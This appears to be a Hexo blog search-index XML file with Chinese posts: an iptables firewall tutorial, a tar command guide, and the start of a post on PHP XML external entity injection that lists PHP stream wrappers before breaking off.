<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>iptables</title>
      <link href="/2024/05/31/iptables/"/>
      <url>/2024/05/31/iptables/</url>
      
        <content type="html"><![CDATA[<h1 id="基础模型与参数介绍"><a href="#基础模型与参数介绍" class="headerlink" title="基础模型与参数介绍"></a>基础模型与参数介绍</h1><h2 id="什么是防火墙-防火墙的分类有哪些？"><a href="#什么是防火墙-防火墙的分类有哪些？" class="headerlink" title="什么是防火墙?防火墙的分类有哪些？"></a>什么是防火墙?防火墙的分类有哪些？</h2><p>防火墙技术是通过有机结合各类用于安全管理与筛选的软件和硬件设备，帮助计算机网络于其内、外网之间构建一道相对隔绝的保护屏障，以保护用户资料与信息安全性的一种技术。</p><p>防火墙对流经它（进出）的网络通信进行扫描，这样能够过滤掉一些攻击，以免其在目标计算机上被执行。防火墙还可以关闭不使用的端口。而且它还能禁止特定端口的流出通信，封锁特洛伊木马。最后，它可以禁止来自特殊站点的访问，从而防止来自不明入侵者的所有通信。</p><p>一般情况下，防火墙可依据下图进行分类：</p><p><img src="C:\Users\yxz\Desktop\b9140129-b0ee-4813-8424-cd972b56f433.png" alt="b9140129-b0ee-4813-8424-cd972b56f433"></p><p>从逻辑上防火墙可以大体分为主机防火墙和网络防火墙。</p><p>主机防火墙：针对于单个主机进行防护。</p><p>网络防火墙：针对于多个主机组成的网络进行防护。往往处于需要被保护的网络入口或边缘，对网络入口进行防护，服务于防火墙背后的本地局域网。</p><p>从物理上防火墙可以分为硬件防火墙和软件防火墙。</p><p>硬件防火墙：在硬件级别实现部分防火墙功能，另一部分功能基于软件实现，性能高，成本高。</p><p>软件防火墙：应用软件处理逻辑运行于通用硬件平台之上的防火墙，性能低，成本低，比如我们常见的windows自带防火墙，就属软件防火墙。</p><p><a href="https://blog.csdn.net/m0_52165864/article/details/126987346">什么是网络边界</a></p><h2 id="什么是iptables？"><a href="#什么是iptables？" class="headerlink" title="什么是iptables？"></a>什么是iptables？</h2><p>​iptables 是与 3.5及以后版本 Linux 内核集成的 IP 信息包过滤系统。一般我们称iptables是防火墙，理解为linux上的软件防火墙，与大多数的Linux软件一样，这个包过滤防火墙是免费的，一般内置在Centos与RedHat中。但是在在RHEL7系统中，firewalld防火墙取代了iptables防火墙，Centos7中的默认防火墙也是firewalld，如果想要在Centos7系统中使用iptables，需要安装。</p><p>iptables可以根据数据包中的地址、端口、协议、状态、资源、内容等信息，对数据包进行过滤，并采取相应的处理措施。</p><p>​但是从严格意义来讲，<strong>iptables</strong>其实不是真正的防火墙，他的全称应该是“netfilter&#x2F;iptables IP 数据包过滤系统”，由两个组件netfilter 和 iptables 组成。我们可以把它理解成一个客户端代理，用户通过iptables这个代理，将用户的安全设定执行到对应的”安全框架”中，这个”安全框架”才是真正的防火墙，这个框架的名字叫<strong>netfilter。</strong>位于内核空间。而iptables位于用户空间，是一个命令行工具，我们用这个工具操作netfilter，习惯上将两者组合起来称iptables防火墙。</p><p>Netfilter是Linux操作系统核心层内部的一个数据包处理模块，它具有如下功能：</p><p>网络地址转换(Network Address Translate)</p><p>数据包内容修改</p><p>以及数据包过滤的防火墙功能</p><p>所以说，虽然我们使用service iptables start启动iptables”服务”，但是其实准确的来说，iptables并没有一个守护进程，所以并不能算是真正意义上的服务，而应该算是内核提供的功能。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>防火墙主机：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统类别：Centos 7.3</span><br><span class="line">内核版本：3.10.0-693.el7.x86_64</span><br><span class="line">操作软件：iptables v1.4.21</span><br><span class="line">IP 地址：192.168.0.2</span><br></pre></td></tr></table></figure><p>客户端主机：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">系统类别：Kali Linux 2020.1</span><br><span class="line">内核版本：5.5.0-kali2-amd64</span><br><span class="line">IP地 址：192.168.0.4</span><br></pre></td></tr></table></figure><p>本次实验共分为三个部分</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. iptables基础模型与概念介绍</span><br><span class="line">2. iptables基础使用方式</span><br><span class="line">3. iptables参数解释</span><br></pre></td></tr></table></figure><h3 id="iptables基础模型与概念介绍"><a href="#iptables基础模型与概念介绍" class="headerlink" title="iptables基础模型与概念介绍"></a>iptables基础模型与概念介绍</h3><p>iptables是由链、表和规则三个元素组成。</p><p>表是链的容器，链是规则的容器。他们三个之间的关系，我们下面细讲。</p><h4 id="什么是规则？"><a href="#什么是规则？" class="headerlink" title="什么是规则？"></a><strong>什么是规则？</strong></h4><p>规则是iptables面对不同网络报文时采取行动的依据，即iptables是按照规则来办事的。iptables根据规则中指定的匹配条件来尝试匹配每个流经此处的报文，一旦匹配成功，则由规则后面指定的处理动作进行处理；</p><p>规则就像是学校的纪律、公司的规章制度一样。是由网络管理员预定义的针对流经防火墙的网络数据包的一条或一系列的约束条件，一般可以将其格式理解为：“如果接收到的数据包头符合设定的条件，就按照设定的处理方式来处理这个数据包”。</p><p>规则存储在内核空间的信息包过滤表中，这些规则可以指定源地址、目的地址、传输协议（如TCP、UDP、ICMP）和服务类型（如HTTP、FTP和SMTP）等。当数据包的某些字段与某条规则指定的所有条件匹配时，iptables就根据规则所定义的处理动作来处理这些数据包，如放行（accept）、拒绝（reject）和丢弃（drop）等。</p><p>配置防火墙的主要工作就是添加、修改和删除这些规则。</p><h4 id="什么是链？"><a href="#什么是链？" class="headerlink" title="什么是链？"></a><strong>什么是链？</strong></h4><p>我们知道，防火墙是根据规则办事的，而规则是一条一条的，根据每一条规则应用场景的不同，可以将这些规则进行分类，每一个分类中按顺序排列着多条规则，像一条链子，所以，这些规则所分成的类，就是我们所说的链。</p><p>当防火墙按照该条链上的规则对网络报文进行匹配的时候，是依次、按照顺序进行匹配，直到找到一条规则能够对该网络报文进行处理，或是直到这条链所有的规则都匹配完，没有匹配到合适的规则，采用默认规则进行处理。</p><p>iptables内置了5条链：PREROUTING链、FORWARD链、POSTROUTING链、INPUT链、OUTPUT链</p><p>PREROUTING： 路由前链，应用于对数据包进行路由选择前，即在网卡刚接收到网络报文时；</p><p>FORWARD：转发链，其作用是将数据包由一个网卡转发至另一个网卡；</p><p>POSTROUTING：路由选择之后所应用的链，应用于防火墙向其他主机转发网络报文时，可对报文进行重新封装；</p><p>INPUT：路由选择后所应用的链，应用于网络报文的目的是防火墙本机的上层应用时，即内核空间的TCP&#x2F;IP协议栈将报文传给用户空间的上层应用时使用的链；</p><p>OUTPUT：防火墙用户空间的上层应用向内核空间的TCP&#x2F;IP协议栈转发报文时使用的链；</p><p>我们用如下图进行一个解析：</p><p>（只是将网络流量流经防火墙时可能用到的链，及使用该链时流量的走向标了出来，并不是说流量完全按照下图表示的方向进行传送，具体情境具体分析）</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240531155402251.png" alt="image-20240531155402251"></p><p>情境1： 网络1中的主机，访问网络2中的某个主机。</p><p>① 网络流量到达网卡eth1后，防火墙进行PREROUTING链的规则匹配，如果通过，则进入下一步</p><p>② 网络流量经过TCP&#x2F;IP协议栈，进行路由选择。</p><p>③ 由于目的地址是网络2中的主机，所以TCP&#x2F;IP协议栈需要将流量从网卡eth1转发到网卡eth0，防火前在此时进行FORWARD链的规则匹配</p><p>④ 防火墙进行POSTROUTING链的规则匹配，对流量进行重新封装，经由网卡eth0发送给网络2中的主机</p><p>⑤ 网络2中主机的响应流量，与前面的请求流量的路径差不多，eth0 –&gt; PREROUTING链 –&gt; TCP&#x2F;IP协议栈 –&gt; FORWARD链 –&gt; POSTROUTING链 –&gt; eth1</p><p>情境2： 网络1中的主机，访问防火墙本机上层的一个应用。</p><p>① 网络流量到达网卡eth1后，防火墙进行PREROUTING链的规则匹配，如果通过，则进入下一步</p><p>② 网络流量经过TCP&#x2F;IP协议栈，进行路由选择。</p><p>③ 由于目的地址是防火墙本机的上层应用，所以TCP&#x2F;IP协议栈向上层服务转发流量，防火墙进行INPUT链的规则匹配</p><p>④ 上层服务在处理完流量后，给与回应，防火墙进行OUTPUT链的规则匹配</p><p>⑤ 流量经过TCP&#x2F;IP协议栈，进行路由选择后，TCP&#x2F;IP协议栈将流量向网卡eth1转发</p><p>⑥ 防火墙进行POSTROUTING链的规则匹配，对流量报文进行重新封装后，经由网卡eth1发送给网络1</p><p>经过上面两个情境的分析，我们就可以知道防火墙中，链是如何运作的，也可以总结出更为准确的流程图：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240531163716824.png" alt="image-20240531163716824"></p><h4 id="什么是表"><a href="#什么是表" class="headerlink" title="什么是表"></a>什么是表</h4><p>表与链不同，表是根据规则功能的不同而进行的分类，把这些实现相同功能的规则放在一起形成一个分类，这个分类就叫做表。比如将都是对IP或者端口进行过滤过滤的规则分为一类。</p><p>不同功能的规则，我们可以放置在不同的表中进行管理，而iptables中默认有4种表，每种表对应了不同的功能，而我们所能定义的规则也基本都在这4种功能的范围之内，具体如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter表：负责过滤功能，实现对数据包的过滤，起到真正的安全效果。</span><br><span class="line"></span><br><span class="line">nat表：network address translation，网络地址转换功能，不能过滤数据包，仅仅是修改数据包中的IP和端口，即重新封装数据包</span><br><span class="line"></span><br><span class="line">mangle表：拆解报文，做出修改，并重新封装的功能，不能过滤，也不能修改IP和端口，其修改的功能是指根据规则修改数据包的隐写标志位，比如TTL、TOS值，以便其他规则或程序可以根据这个标志来对数据包进行过滤或策略路由。</span><br><span class="line"></span><br><span class="line">raw表：关闭nat表上启用的连接追踪机制。可以决定是否使用iptables对数据包进行跟踪处理，比如访问量很大的web服务80端口，就可以在raw表中设置规则，让iptables不对80端口的数据包进行链接追踪处理，以此来提高性能。</span><br></pre></td></tr></table></figure><p>当然，iptables也支持我们定义自己的表。</p><h4 id="表链关系"><a href="#表链关系" class="headerlink" title="表链关系"></a>表链关系</h4><p>我们一开始说，表是链的容器，链是规则的容器，那么他们三个之间的关系究竟是怎样的？可以用如下图简单的表示：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240531163813771.png" alt="image-20240531163813771"></p><p>prerouting链上所能配置的规则，只拥有nat表、raw表和mangle表所对应的功能，所以，prerouting中的规则只能存放于nat表、raw表和mangle表中。也就是说，不是每个表中都包含所有的链。</p><p>他们之间的关系如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">raw 表包含的链：PREROUTING，OUTPUT</span><br><span class="line"></span><br><span class="line">mangle 表包含的链：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING</span><br><span class="line"></span><br><span class="line">nat 表包含的链：PREROUTING，OUTPUT，POSTROUTING（centos7中还有INPUT，centos6中没有）</span><br><span class="line"></span><br><span class="line">filter 表中包含的链：INPUT，FORWARD，OUTPUT</span><br></pre></td></tr></table></figure><p>到这里，我们还需要注意一点，就是优先级的问题，iptables中，在数据包经过一个”链”的时候，会将当前链的所有规则都匹配一遍，但是匹配时总归要有顺序，又因为相同功能类型的规则会汇聚在一张”表”中，所以这里“优先级”的主题，就是“表”。总结为一下就是“哪些”表”中的规则会放在”链”的最前面执行？”</p><p>当iptables中的4种表处于同一条”链”时，执行的优先级为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">raw –&gt; mangle –&gt; nat –&gt; filter</span><br></pre></td></tr></table></figure><h4 id="iptables防火墙的工作模型"><a href="#iptables防火墙的工作模型" class="headerlink" title="iptables防火墙的工作模型"></a>iptables防火墙的工作模型</h4><p>结合上述所有的描述，我们可以将数据包通过防火墙的流程总结为下图：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240531164122244.png" alt="image-20240531164122244"></p><h4 id="规则的组成"><a href="#规则的组成" class="headerlink" title="规则的组成"></a><strong>规则的组成</strong></h4><p>规则由匹配条件和处理动作组成。</p><h4 id="匹配条件"><a href="#匹配条件" class="headerlink" title="匹配条件"></a>匹配条件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">匹配条件分为基本匹配条件与扩展匹配条件</span><br></pre></td></tr></table></figure><h4 id="基本匹配条件："><a href="#基本匹配条件：" class="headerlink" title="基本匹配条件："></a><strong>基本匹配条件：</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">源地址Source IP；</span><br><span class="line">目标地址 Destination IP；</span><br><span class="line">协议类型 protocol；</span><br><span class="line">网卡接口 ；</span><br><span class="line">等。</span><br></pre></td></tr></table></figure><h4 id="扩展匹配条件："><a href="#扩展匹配条件：" class="headerlink" title="扩展匹配条件："></a><strong>扩展匹配条件：</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">除了上述的条件可以用于匹配，还有很多其他的条件可以用于匹配，这些条件泛称为扩展条件，这些扩展条件其实也是netfilter中的一部分，只是以模块的形式存在，如果想要使用这些条件，则需要依赖对应的扩展模块。如：</span><br><span class="line">MAC地址；</span><br><span class="line">字符串；</span><br><span class="line">多个源/目的端口；</span><br><span class="line">时间；</span><br><span class="line">等</span><br></pre></td></tr></table></figure><h4 id="处理动作"><a href="#处理动作" class="headerlink" title="处理动作"></a><strong>处理动作</strong></h4><p>处理动作也可以分为基本动作和扩展动作。</p><p>常用的处理动作有：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ACCEPT：允许数据包通过。</span><br><span class="line">DROP：直接丢弃数据包，不给任何回应信息，这时候客户端会感觉自己的请求泥牛入海了，过了超时时间才会有反应。</span><br><span class="line">REJECT：拒绝数据包通过，必要时会给数据发送端一个响应的信息，客户端刚请求就会收到拒绝的信息。</span><br><span class="line">SNAT：源地址转换，解决内网用户用同一个公网地址上网的问题。</span><br><span class="line">MASQUERADE：是SNAT的一种特殊形式，适用于动态的、临时会变的ip上。</span><br><span class="line">DNAT：目标地址转换。</span><br><span class="line">REDIRECT：在本机做端口映射。</span><br><span class="line">LOG：在/var/log/messages文件中记录日志信息，然后将数据包传递给下一条规则，也就是说除了记录以外不对数据包做任何其他操作，仍然让下一条规则去匹配。</span><br></pre></td></tr></table></figure><h3 id="iptables基础使用方式"><a href="#iptables基础使用方式" class="headerlink" title="iptables基础使用方式"></a>iptables基础使用方式</h3><p><strong>如何在centos中查看iptables是否启动？</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用 “service iptables  status” 查看防火墙的状态</span><br></pre></td></tr></table></figure><p>如图，绿色的active表示防火墙处于激活状态，即正在运行中。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240531164316414.png" alt="image-20240531164316414"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用“service iptables stop” 关闭防火墙</span><br></pre></td></tr></table></figure><p><strong>怎样查看表中的规则？比如查看filter表中的规则</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用 “iptables -t filter -L” 将iptables表的内容展示出来</span><br></pre></td></tr></table></figure><p>如上命令中，-t表示指定查看哪个表的规则，-L 表示将结果列出来。</p><p>如下图所示，iptables会返回filter表中存在的各个链（INPUT、FORWARD、OUTPUT）以及链中存在的规则</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240531165325541.png" alt="image-20240531165325541"></p><p>其实上列中的命令可以使用 “iptables -L” 来代替，因为filter表是iptables的默认表，在不使用-t参数指定表名的情况下，默认是对filter进行操作。</p><p>我们也可以查看其它表中的规则，示例如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -t raw -L</span><br><span class="line">iptables -t mangle -L</span><br><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure><p><strong>如何查看指定表中的指定链的规则？</strong></p><p>比如，我们只查看filter表中INPUT链的规则，示例如下（注意链名的大小写）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -L INPUT //-t filter被省略</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240531165425661.png" alt="image-20240531165425661"></p><p>可以看到，使用-v选项后，iptables展示的信息更多了，多出了很多原来没有的字段，这些字段就是规则对应的属性。具体如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pkts:对应规则匹配到的报文的个数。</span><br><span class="line"></span><br><span class="line">bytes:对应匹配到的报文包的大小总和。</span><br><span class="line"></span><br><span class="line">target:规则对应的target，往往表示规则对应的”动作”，即规则匹配成功后需要采取的措施。</span><br><span class="line"></span><br><span class="line">prot:protocol的简写，表示规则对应的协议，是否只针对某些协议应用此规则。</span><br><span class="line"></span><br><span class="line">opt:表示规则对应的选项。</span><br><span class="line"></span><br><span class="line">in:表示数据包由哪个接口(网卡)流入，我们可以设置通过哪块网卡流入的报文需要匹配当前规则。</span><br><span class="line"></span><br><span class="line">out:表示数据包由哪个接口(网卡)流出，我们可以设置通过哪块网卡流出的报文需要匹配当前规则。</span><br><span class="line"></span><br><span class="line">source:表示规则对应的源头地址，可以是一个IP，也可以是一个网段。</span><br><span class="line"></span><br><span class="line">destination:表示规则对应的目标地址。可以是一个IP，也可以是一个网段。anywhere是iptables默认对IP地址进行了名称解析，如果规则较多的情况下，会降低iptables的工作效率，可以使用-n参数表示不对名称进行反解，直接显示IP地址。</span><br></pre></td></tr></table></figure><p><strong>使用-n参数不对名称进行反解</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -vnL INPUT</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240531165520132.png" alt="image-20240531165520132"></p><p><strong>使用–line-numberc 显示规则的序号</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables --line-number -vnL INPUT</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240531165550757.png" alt="image-20240531165550757"></p><p>如果觉得 –line-number 比较长，也可以使用–line：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables --line -vnL INPUT</span><br></pre></td></tr></table></figure><p><strong>默认策略</strong></p><p>每条链都有自己的默认策略，如何查看默认策略？默认策略的表述就在每个链后面的括号里：</p><p><strong>policy</strong>表示当前链的默认策略，policy ACCEPT表示上图中INPUT的链的默认动作为ACCEPT，换句话说就是，当没有没有匹配到相应的规则时，默认接受通过INPUT链的所有请求。</p><p><strong>packets</strong>表示当前链（上例为INPUT链）默认策略匹配到的包的数量，0 packets表示默认策略匹配到0个包。</p><p><strong>bytes</strong>表示当前链默认策略匹配到的所有包的大小总和。</p><p>其实，我们可以把packets与bytes称作”计数器”，上图中的计数器记录了默认策略匹配到的报文数量与总大小，”计数器”只会在使用-v选项时，才会显示出来。</p><p>当被匹配到的包达到一定数量时，计数器会自动将匹配到的包的大小转换为可读性较高的单位。如果想要查看精确的计数值，可以使用-x参数。</p><p>可以使用如下命令来修改默认规则（可以尝试修改其他链的默认规则，修改INPUT的默认规则，可能导致远程连接的断开）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -P INPUT DROP //将filter表的INPUT链的默认规则更改为DROP</span><br></pre></td></tr></table></figure><h3 id="iptables参数解释"><a href="#iptables参数解释" class="headerlink" title="iptables参数解释"></a>iptables参数解释</h3><p>现在开始详细了解iptables的语法和部分参数。</p><p>使用man命令查看帮助信息：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240531165843715.png" alt="image-20240531165843715"></p><p>如上图，使用man命令查看之后，列出了iptables的大多数参数的使用示例。可总结出iptables的使用语法：</p><p>格式：iptables [-t 表名] COMMAND 链名 [规则序号] 匹配条件 -j 执行操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[-t 表名]： 表示该项可省略，省略该参数的情况下，默认是对filter表进行操作。</span><br><span class="line">COMMAND：要执行的命令，比如添加、删除、修改、替换规则。</span><br><span class="line">[规则序号]：规则序号就是对该链下的第几条规则进行操作，如果省略的话，默认是对最后一条规则进行操作。</span><br><span class="line">匹配条件： 对什么样的数据包进行匹配</span><br><span class="line">执行操作： 对匹配到的数据包执行的操作，比如ACCEPT（接受）、DROP（丢弃）、REJECT（拒绝）</span><br></pre></td></tr></table></figure><p>接下来我们详细介绍部分COMMAND常用参数的作用，如下图</p><p>例如： -A 表示短项，–append表示长项，使用的时候选其一即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-A --append 链名 ：在指定的链中追加规则，一般是在末尾追加。</span><br><span class="line">-I --insert 链名 [规则序号num]：在指定的链中插入规则，默认是在首部插入，可指定位置。</span><br><span class="line">-D --delete 链名 [规则序号num]：删除指定链中的指定规则，默认是删除最后一个，可指定位置。</span><br><span class="line">-R --replace 链名 [规则序号num]：替换规则，可指定位置。</span><br><span class="line">-F --flush [链名] ：清除指定链中的规则，如果没有指定链名的话，则默认是清除指定表中的所有链下的规则。</span><br><span class="line">-N --new-chain 链名：除自有的5条链之外，还可使用该参数创建新的链。</span><br><span class="line">-X --delete-chain 链名：删除自定义的链。但是链必须是在空链的状态下。</span><br><span class="line">-Z --zero 链名：将指定链的计数器置零。</span><br><span class="line">-P --policy 链名：修改指定链的默认策略。</span><br><span class="line">-L --list ：显示iptables中的规则列表。这个参数，我们在上面的章节中已经接触过了，它还有几个可以结合使用的参数：</span><br><span class="line">  -n ： 使用数字显示，如果不加该参数，iptables会将数字反解为服务名，当规则数量较多时，会影响iptables的效率，速度会变慢，所以一般情况下要添加该参数。</span><br><span class="line">  -v ： 显示规则的详细信息，包阔每一个规则的计数器。</span><br><span class="line">  --line：显示规则的时候，在规则的前面显示序号。</span><br></pre></td></tr></table></figure><p>那么上面的是COMMAND部分的常用参数，那么在匹配条件部分也有一些常用的参数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-p --protocol 协议：指定需要匹配的目标协议，比如tcp、icmp、http等</span><br><span class="line">-s --source 地址：指定需要匹配的源地址</span><br><span class="line">-d --destination 地址：指定需要匹配的目标地址</span><br><span class="line">-i --in-interface 名称：指定网络流量包流入的网卡，即对流入该网卡的流量包进行匹配</span><br><span class="line">-o --out-interface 名称：指定网络流量包流出的网卡，即对流出该网卡的流量包进行匹配</span><br></pre></td></tr></table></figure><p>我们可以使用几个例子来练习一下这些参数的使用：</p><p>假设我们现在要进行的规则匹配，是其他主机对防火墙本机的请求流量，所以我们需要对INPUT链进行规则的添加：</p><p>我们先查看INPUT现有的规则：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -L INPUT -n --line</span><br></pre></td></tr></table></figure><p>假设我们现在要禁止别的主机对本机进行ping探测，所以要配置一个icmp协议相关的规则，并且其采用的处理方式是拒绝。</p><p>所以我们看上图中的规则，发现第二条规则是跟icmp协议相关的规则，但是其处理方式是ACCEPT接受。这样的话，如果有ping探测包到达本机的时候，进行规则的匹配，等匹配到第二条规则的时候，就会直接通过，不会再匹配到我们新的规则。</p><p>我们可以做如下测试：</p><p>先添加规则：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p icmp -s 192.168.0.4 -j DROP</span><br></pre></td></tr></table></figure><p>查看规则，可以看见现在有两条跟icmp相关的规则（此处的情况在不同人的实验环境中，可能会有不同）：</p><p>然后我们使用kali对本机进行ping探测：</p><p>发现可以正常探测，说明我们刚刚添加的拒绝规则没有起到效果。我们删除第二条规则：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -D INPUT 2</span><br></pre></td></tr></table></figure><p>发现可以正常探测，说明我们刚刚添加的拒绝规则没有起到效果。我们删除第二条规则：</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240531170806691.png" alt="image-20240531170806691"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240531170810715.png" alt="image-20240531170810715"></p><p>清空规则，只是清空了系统加载在内存中的规则，并没有保存。所以如果要使添加的规则不在重启后消失，需要保存。</p><p>可以使用如下命令进行保存</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service iptables save  或者 iptables-save &gt; /etc/sysconfig/iptables</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-tar</title>
      <link href="/2024/05/30/linux-tar/"/>
      <url>/2024/05/30/linux-tar/</url>
      
        <content type="html"><![CDATA[<p>附文：<a href="https://blog.csdn.net/qq_43657810/article/details/132328941">https://blog.csdn.net/qq_43657810/article/details/132328941</a></p><p><a href="https://blog.csdn.net/qq_16268979/article/details/127780124">https://blog.csdn.net/qq_16268979/article/details/127780124</a></p><p><strong>1、创建归档文件：</strong>将文件 file1、file2 和 directory 打包到一个名为 archive.tar 的归档文件中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -cvf archive.tar file1 file2 directory</span><br></pre></td></tr></table></figure><ul><li><code>-c</code>: 创建新的归档文件</li><li><code>-v</code>: 显示详细输出，列出被添加到归档中的文件</li><li><code>-f</code>: 指定归档文件的名称</li></ul><p><strong>2、解压归档文件：</strong>解压名为 archive.tar 的归档文件，还原其中包含的文件和目录。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -xvf archive.tar</span><br></pre></td></tr></table></figure><ul><li><code>-x</code>: 解压归档文件</li><li><code>-v</code>: 显示详细输出，列出被解压的文件</li><li><code>-f</code>: 指定要解压的归档文件的名称</li></ul><p><strong>3、压缩归档文件：</strong>将名为 directory 的目录打包成一个归档文件，然后使用 gzip 进行压缩，生成名为 archive.tar.gz 的文件。</p><ul><li><code>-c</code>: 创建新的归档文件</li><li><code>-z</code>: 使用 gzip 压缩归档文件</li><li><code>-v</code>: 显示详细输出，列出被添加到归档中的文件</li><li><code>-f</code>: 指定归档文件的名称</li></ul><h3 id="指定压缩格式"><a href="#指定压缩格式" class="headerlink" title="指定压缩格式"></a>指定压缩格式</h3><p>tar 可以结合不同的压缩程序来创建和解压压缩归档文件。</p><p><strong>z</strong> : 使用 gzip 压缩。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -czvf archive.tar.gz directory</span><br><span class="line">tar -xzvf archive.tar.gz</span><br></pre></td></tr></table></figure><p><strong>j</strong>: 使用 bzip2 压缩。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -cjvf archive.tar.bz2 directory</span><br><span class="line">tar -xjvf archive.tar.bz2</span><br></pre></td></tr></table></figure><p><strong>J</strong>: 使用 xz 压缩。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -cJvf archive.tar.xz directory</span><br><span class="line">tar -xJvf archive.tar.xz</span><br></pre></td></tr></table></figure><p>补充：</p><p>有一堆文件来自两个tar文件，怎么单独删除来自某个文件的解压文件，可以利用xargs</p><figure class="highlight console"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost tar_test]$ tar -tvf odd.tar</span><br><span class="line">-rw-rw-r-- youzipii/youzipii 10240 2024-05-30 20:53 file1</span><br><span class="line">-rw-rw-r-- youzipii/youzipii     0 2024-05-30 20:26 file3</span><br><span class="line">-rw-rw-r-- youzipii/youzipii     0 2024-05-30 20:26 file5</span><br><span class="line">[youzipii@localhost tar_test]$ tar -tvf even.tar</span><br><span class="line">-rw-rw-r-- youzipii/youzipii 0 2024-05-30 20:58 file0</span><br><span class="line">-rw-rw-r-- youzipii/youzipii 0 2024-05-30 20:58 file2</span><br><span class="line">-rw-rw-r-- youzipii/youzipii 0 2024-05-30 20:58 file4</span><br><span class="line">[youzipii@localhost tar_test]$ ls</span><br><span class="line">even.tar  file0  file1  file2  file3  file4  file5  odd.tar</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -tf odd.tar | xargs rm -f</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP的xml外部实体注入</title>
      <link href="/2024/05/30/PHP%E7%9A%84xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/05/30/PHP%E7%9A%84xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="php的xml外部实体注入"><a href="#php的xml外部实体注入" class="headerlink" title="php的xml外部实体注入"></a>php的xml外部实体注入</h1><h2 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h2><p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 <a href="https://www.php.net/manual/zh/function.fopen.php">fopen()</a>、 <a href="https://www.php.net/manual/zh/function.copy.php">copy()</a>、 <a href="https://www.php.net/manual/zh/function.file-exists.php">file_exists()</a> 和 <a href="https://www.php.net/manual/zh/function.filesize.php">filesize()</a> 的文件系统函数。 除了这些封装协议，还能通过 <a href="https://www.php.net/manual/zh/function.stream-wrapper-register.php">stream_wrapper_register()</a> 来注册自定义的封装协议。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:// — 访问本地文件系统</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span 